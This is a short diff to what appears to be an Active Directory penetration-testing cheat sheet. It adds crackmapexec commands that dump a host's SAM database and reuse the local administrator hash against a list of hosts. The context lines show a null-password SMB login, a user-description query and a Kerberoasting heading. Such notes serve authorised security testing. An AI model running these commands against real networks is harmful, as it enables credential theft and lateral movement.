@@ -82,6 +82,18 @@ crackmapexec smb <DC IP> -u <USER> -p ''
 Get-DomainUser | Where-Object -Property Description | Select-Object samaccountname, description
 ```
 
+## Reuse local admin password
+#### Dump sam database
+- Requires local admin access
+```
+crackmapexec smb <HOST> -u <USER> -p <PASSWORD> -d <DOMAIN> --sam
+```
+
+#### Reuse local administrator password against all other hosts
+```
+crackmapexec smb hosts.txt -u administrator -H <HASH> -d .
+```
+
 ## Kerberoast
 - https://github.com/GhostPack/Rubeus
 #### Find user accounts used as service accounts
